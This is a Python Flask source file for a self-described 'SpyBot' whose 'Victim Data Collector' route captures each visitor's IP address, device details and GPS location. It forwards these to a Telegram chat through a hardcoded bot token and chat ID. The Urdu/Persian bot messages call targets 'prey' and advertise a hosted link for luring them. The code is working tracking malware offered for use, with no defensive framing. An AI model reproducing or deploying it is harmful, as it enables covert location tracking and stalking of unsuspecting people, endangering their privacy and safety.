from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

# Telegram Bot Info
BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
CHAT_ID = "6908281054"

# Home Page
@app.route('/')
def index():
    return render_template("spy.html")

# Victim Data Collector
@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    location_link = f"https://www.google.com/maps?q={latitude},{longitude}"

    message = f"""
👁️ شکار آیا!
🌐 IP Address: {ip}
📱 Device Info: {user_agent}
📍 Location: {location_link}
🧠 Raw Data: {data}
    """

    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  data={'chat_id': CHAT_ID, 'text': message})
    return "OK", 200

# 📌 Handle Telegram Webhook
@app.route(f'/{BOT_TOKEN}', methods=['POST'])
def telegram_webhook():
    update = request.json

    if "message" in update and "text" in update["message"]:
        chat_id = update["message"]["chat"]["id"]
        text = update["message"]["text"]

        if text == "/start":
            welcome = f"""
👋 خوش آمدید فیضانؔ مغل کے SpyBot میں!
🔗 لنک: https://faizan-spybot.onrender.com
📍 یہاں سے شکار کی معلومات حاصل کریں!
"""
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                          data={"chat_id": chat_id, "text": welcome})
    return "OK", 200

# Render Hosting Compatible Run
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
